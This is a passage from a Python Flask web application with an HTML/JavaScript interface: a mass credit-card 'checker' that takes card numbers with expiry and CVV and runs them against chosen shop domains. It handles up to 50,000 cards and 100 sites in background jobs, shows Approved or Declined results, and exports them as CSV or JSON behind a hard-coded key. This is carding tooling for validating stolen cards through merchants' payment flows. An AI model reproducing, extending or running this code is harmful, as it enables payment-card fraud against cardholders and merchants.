<div class="counter-value" id="live-counter-value">0/0</div>
</div>
<script>
let currentJobId=null;
let currentResults=[];
let statusInterval=null;
let allDomains=new Set();
function switchTab(tabName,el){
document.querySelectorAll('.tab-content').forEach(tab=>tab.classList.remove('active'));
document.querySelectorAll('.tab').forEach(tab=>tab.classList.remove('active'));
document.getElementById(tabName+'-tab').classList.add('active');
if(el)el.classList.add('active');
}
function showNotification(message,type){
const notification=document.getElementById('notification');
notification.textContent=message;
notification.className='notification notification-'+type;
notification.classList.add('show');
setTimeout(()=>notification.classList.remove('show'),3000);
}
function copyToClipboard(text){
navigator.clipboard.writeText(text).then(()=>showNotification('Copied to clipboard!','success'));
}
function formatCardNumber(cardNumber){
if(!cardNumber||cardNumber.length<=4)return cardNumber||'N/A';
return cardNumber.substring(0,4)+'xxxxxxxxxxxx'+cardNumber.substring(cardNumber.length-4);
}
function checkSingleCard(){
const site=document.getElementById('single-site').value.trim();
const cc=document.getElementById('single-cc').value.trim();
const resultContainer=document.getElementById('single-result');
const resultContent=document.getElementById('single-result-content');
const loader=document.getElementById('single-loader');
if(!site||!cc){showNotification('Please fill in all fields','error');return;}
loader.style.display='inline-block';
resultContent.innerHTML='';
resultContainer.classList.add('show');
resultContainer.classList.remove('result-success','result-error');
fetch(`/process?key=inferno&site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}`)
.then(response=>response.json())
.then(data=>{
loader.style.display='none';
const cardParts=cc.split('|');
const cardNumber=cardParts[0];
const errorTypeHtml=data.ErrorType?`<div class="card-errortype">Error Type: ${data.ErrorType}</div>`:'';
resultContent.innerHTML=`<div class="result-item ${data.Status==='Approved'?'success':'error'}"><div class="card-number">Card: ${formatCardNumber(cardNumber)}</div><div class="card-domain">Domain: ${site}</div><div class="card-response">Response: ${data.Response}</div><div class="card-status">Status: ${data.Status}</div>${errorTypeHtml}</div>`;
if(data.Status==='Approved'){resultContainer.classList.add('result-success');showNotification('Payment successful!','success');}
else{resultContainer.classList.add('result-error');showNotification('Payment declined: '+data.Response,'error');}
})
.catch(error=>{
loader.style.display='none';
resultContent.innerHTML=`<div class="result-item error"><div class="card-response">Error: ${error.message}</div></div>`;
resultContainer.classList.add('result-error');
showNotification('An error occurred','error');
});
}
function clearSingleResults(){
document.getElementById('single-result').classList.remove('show');
document.getElementById('single-site').value='';
document.getElementById('single-cc').value='';
}
function checkMassCards(){
try{
const sitesText=document.getElementById('mass-sites').value.trim();
const ccText=document.getElementById('mass-cc').value.trim();
const loader=document.getElementById('mass-loader');
const btn=document.getElementById('mass-check-btn');
if(!sitesText||!ccText){showNotification('Please fill in both sites and cards fields','error');return;}
const sites=sitesText.split(/[,; \n]+/).filter(s=>s.trim());
const cards=ccText.split('\n').filter(c=>c.trim());
if(sites.length===0){showNotification('Please enter at least one valid site','error');return;}
if(cards.length===0){showNotification('Please enter at least one valid card','error');return;}
if(sites.length>100){showNotification('Maximum 100 sites allowed','error');return;}
if(cards.length>50000){showNotification('Maximum 50,000 cards allowed','error');return;}
btn.disabled=true;
loader.style.display='inline-block';
document.getElementById('mass-progress').style.display='block';
document.getElementById('mass-stats').style.display='flex';
document.getElementById('mass-result').classList.add('show');
document.getElementById('mass-result-content').innerHTML='';
document.getElementById('mass-progress-fill').style.width='0%';
document.getElementById('export-btn').style.display='none';
document.getElementById('export-json-btn').style.display='none';
document.getElementById('mass-total').textContent=sites.length*cards.length;
document.getElementById('mass-processed').textContent='0';
document.getElementById('mass-approved').textContent='0';
document.getElementById('mass-declined').textContent='0';
document.getElementById('mass-errors').textContent='0';
currentResults=[];
allDomains=new Set();
updateDomainFilter();
document.getElementById('live-counter').classList.add('show');
fetch('/mass_check',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({key:'inferno',sites:sites,cards:cards})
})
.then(response=>response.json())
.then(data=>{
if(data.error){showNotification(data.error,'error');btn.disabled=false;loader.style.display='none';return;}
currentJobId=data.job_id;
showNotification('Mass check started! Job ID: '+currentJobId,'info');
startStatusPolling();
})
.catch(error=>{
showNotification('Failed to start mass check: '+error.message,'error');
btn.disabled=false;
loader.style.display='none';
});
}catch(err){console.error('checkMassCards error:',err);showNotification('Error: '+err.message,'error');document.getElementById('mass-check-btn').disabled=false;document.getElementById('mass-loader').style.display='none';}}
function startStatusPolling(){
if(statusInterval)clearInterval(statusInterval);
statusInterval=setInterval(()=>{
if(!currentJobId)return;
fetch(`/mass_status?key=inferno&job_id=${currentJobId}`)
.then(response=>response.json())
.then(data=>{
if(data.error){
clearInterval(statusInterval);
showNotification(data.error,'error');
document.getElementById('mass-check-btn').disabled=false;
document.getElementById('mass-loader').style.display='none';
return;
}
document.getElementById('mass-total').textContent=data.total||0;
document.getElementById('mass-processed').textContent=data.processed||0;
document.getElementById('mass-approved').textContent=data.approved||0;
document.getElementById('mass-declined').textContent=data.declined||0;
document.getElementById('mass-errors').textContent=data.errors||0;
const progress=data.total>0?(data.processed/data.total)*100:0;
document.getElementById('mass-progress-fill').style.width=progress+'%';
document.getElementById('live-counter-value').textContent=(data.processed||0)+'/'+(data.total||0);
if(data.processed>0){
fetch(`/mass_results?key=inferno&job_id=${currentJobId}`)
.then(r=>r.json())
.then(resultData=>{
if(resultData.results){
currentResults=resultData.results;
resultData.results.forEach(r=>{if(r.Domain)allDomains.add(r.Domain);});
updateDomainFilter();
filterResults();
}
});
}
if(data.status==='completed'||data.status==='error'){
clearInterval(statusInterval);
document.getElementById('mass-check-btn').disabled=false;
document.getElementById('mass-loader').style.display='none';
document.getElementById('export-btn').style.display='inline-block';
document.getElementById('export-json-btn').style.display='inline-block';
document.getElementById('live-counter').classList.remove('show');
if(data.status==='completed'){
showNotification('Mass check completed! Approved: '+(data.approved||0)+', Declined: '+(data.declined||0)+', Errors: '+(data.errors||0),'success');
}else{
showNotification('Mass check failed: '+(data.error_message||'Unknown error'),'error');
}
}
})
.catch(error=>{console.error('Status poll error:',error);});
},2000);
}
function updateDomainFilter(){
const select=document.getElementById('filter-domain');
const currentVal=select.value;
select.innerHTML='<option value="all">All Domains</option>';
allDomains.forEach(domain=>{
const option=document.createElement('option');
option.value=domain;
option.textContent=domain;
select.appendChild(option);
});
if(currentVal&&allDomains.has(currentVal))select.value=currentVal;
}
function filterResults(){
const statusFilter=document.getElementById('filter-status').value;
const domainFilter=document.getElementById('filter-domain').value;
const searchFilter=document.getElementById('filter-search').value.toLowerCase();
const tbody=document.getElementById('mass-result-content');
tbody.innerHTML='';
let filtered=currentResults.filter(r=>{
if(statusFilter!=='all'&&r.Status!==statusFilter)return false;
if(domainFilter!=='all'&&r.Domain!==domainFilter)return false;
if(searchFilter){
const cardNum=(r.Card||'').toLowerCase();
const response=(r.Response||'').toLowerCase();
const errType=(r.ErrorType||'').toLowerCase();
if(!cardNum.includes(searchFilter)&&!response.includes(searchFilter)&&!errType.includes(searchFilter))return false;
}
return true;
});
filtered.forEach((result,index)=>{
const row=document.createElement('tr');
const statusClass=result.Status==='Approved'?'badge-success':(result.Status==='Declined'?'badge-error':'badge-warning');
row.innerHTML=`<td>${index+1}</td><td>${formatCardNumber(result.Card)}</td><td>${result.Domain||'N/A'}</td><td>${result.Response||'N/A'}</td><td><span class="badge ${statusClass}">${result.Status||'Unknown'}</span></td><td>${result.ErrorType||'-'}</td><td>${result.Timestamp||'-'}</td>`;
tbody.appendChild(row);
});
}
function clearMassResults(){
document.getElementById('mass-result').classList.remove('show');
document.getElementById('mass-sites').value='';
document.getElementById('mass-cc').value='';
document.getElementById('mass-progress').style.display='none';
document.getElementById('mass-stats').style.display='none';
document.getElementById('export-btn').style.display='none';
document.getElementById('export-json-btn').style.display='none';
document.getElementById('live-counter').classList.remove('show');
if(statusInterval)clearInterval(statusInterval);
currentJobId=null;
currentResults=[];
allDomains=new Set();
}
function exportResults(){
if(!currentJobId){showNotification('No results to export','error');return;}
window.open(`/export_csv?key=inferno&job_id=${currentJobId}`,'_blank');
}
function exportJSON(){
if(!currentJobId){showNotification('No results to export','error');return;}
window.open(`/export_json?key=inferno&job_id=${currentJobId}`,'_blank');
}
</script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/process")
def process_request():
    try:
        key = request.args.get("key")
        domain = request.args.get("site")
        cc = request.args.get("cc")
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not domain:
            return jsonify({"error": "Missing domain parameter", "status": "Bad Request"}), 400
        if domain.startswith("https://"):
            domain = domain[8:]
        elif domain.startswith("http://"):
            domain = domain[7:]
        if not re.match(r"^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,}$", domain):
            return jsonify({"error": "Invalid domain format", "status": "Bad Request"}), 400
        if not cc or not re.match(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", cc):
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
        result = process_card_enhanced(domain, cc)
        return jsonify({
            "Response": result.get("Response", "Unknown response"),
            "Status": result.get("Status", "Unknown status"),
            "ErrorType": result.get("ErrorType", ""),
        })
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/mass_check", methods=["POST"])
def mass_check():
    try:
        data = request.get_json() or {}
        key = data.get("key")
        sites = data.get("sites", [])
        cards = data.get("cards", [])
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not sites or not isinstance(sites, list):
            return jsonify({"error": "Sites must be a non-empty list", "status": "Bad Request"}), 400
        if not cards or not isinstance(cards, list):
            return jsonify({"error": "Cards must be a non-empty list", "status": "Bad Request"}), 400
        if len(sites) > MAX_SITES:
            return jsonify({"error": f"Maximum {MAX_SITES} sites allowed", "status": "Bad Request"}), 400
        if len(cards) > MAX_CARDS:
            return jsonify({"error": f"Maximum {MAX_CARDS} cards allowed", "status": "Bad Request"}), 400
        valid_sites = []
        for site in sites:
            cleaned = validate_domain(site)
            if cleaned:
                valid_sites.append(cleaned)
        if not valid_sites:
            return jsonify({"error": "No valid sites provided", "status": "Bad Request"}), 400
        valid_cards = []
        for card in cards:
            if re.match(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", card.strip()):
                valid_cards.append(card.strip())
        if not valid_cards:
            return jsonify({"error": "No valid cards provided", "status": "Bad Request"}), 400
        job_id = str(uuid.uuid4())
        thread = threading.Thread(target=run_mass_check, args=(job_id, valid_sites, valid_cards))
        thread.daemon = True
        thread.start()
        return jsonify({"job_id": job_id, "status": "started", "total_checks": len(valid_sites) * len(valid_cards)})
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/mass_status")
def mass_status():
    try:
        key = request.args.get("key")
        job_id = request.args.get("job_id")
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not job_id:
            return jsonify({"error": "Missing job_id parameter", "status": "Bad Request"}), 400
        with results_lock:
            status = mass_check_status.get(job_id, {})
        if not status:
            return jsonify({"error": "Job not found", "status": "Not Found"}), 404
        return jsonify(status)
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/mass_results")
def mass_results():
    try:
        key = request.args.get("key")
        job_id = request.args.get("job_id")
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not job_id:
            return jsonify({"error": "Missing job_id parameter", "status": "Bad Request"}), 400
        with results_lock:
            results = mass_check_results.get(job_id, [])
        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/export_csv")
def export_csv():
    try:
        key = request.args.get("key")
        job_id = request.args.get("job_id")
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not job_id:
            return jsonify({"error": "Missing job_id parameter", "status": "Bad Request"}), 400
        with results_lock:
            results = mass_check_results.get(job_id, [])
        if not results:
            return jsonify({"error": "No results found for this job", "status": "Not Found"}), 404
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["#", "Card", "Domain", "Response", "Status", "Error Type", "Timestamp"])
        for i, result in enumerate(results, 1):
            writer.writerow([i, result.get("Card", ""), result.get("Domain", ""), result.get("Response", ""), result.get("Status", ""), result.get("ErrorType", ""), result.get("Timestamp", "")])
        csv_data = output.getvalue()
        output.close()
        return Response(csv_data, mimetype="text/csv", headers={"Content-Disposition": f"attachment; filename=mass_check_{job_id}.csv"})
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/export_json")
def export_json():
    try:
        key = request.args.get("key")
        job_id = request.args.get("job_id")
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not job_id:
            return jsonify({"error": "Missing job_id parameter", "status": "Bad Request"}), 400
        with results_lock:
            results = mass_check_results.get(job_id, [])
            status = mass_check_status.get(job_id, {})
        if not results:
            return jsonify({"error": "No results found for this job", "status": "Not Found"}), 404
        export_data = {"job_id": job_id, "status": status, "results": results, "exported_at": time.strftime("%Y-%m-%d %H:%M:%S")}
        return Response(json.dumps(export_data, indent=2), mimetype="application/json", headers={"Content-Disposition": f"attachment; filename=mass_check_{job_id}.json"})
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/bulk")
def bulk_process_request():
    try:
        key = request.args.get("key")
        cc = request.args.get("cc")
        if key != "inferno":
            return jsonify({"error": "Invalid API key", "status": "Unauthorized"}), 401
        if not cc or not re.match(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", cc):
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
        test_domains = ["example-shop1.com", "example-store2.com", "demo-woocommerce3.com"]
        results = []
        for domain in test_domains:
            try:
                result = process_card_enhanced(domain, cc)
                results.append({"Domain": domain, "Response": result.get("Response", "Unknown"), "Status": result.get("Status", "Unknown"), "ErrorType": result.get("ErrorType", "")})
            except Exception as e:
                results.append({"Domain": domain, "Response": f"Error: {str(e)}", "Status": "Error", "ErrorType": categorize_error(e)})
        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": f"Internal server error: {str(e)}", "status": "Error"}), 500

@app.route("/health")
def health_check():
    return jsonify({"status": "healthy", "max_cards": MAX_CARDS, "max_sites": MAX_SITES}), 200

@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found", "status": "Not Found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error", "status": "Error"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, debug=False)
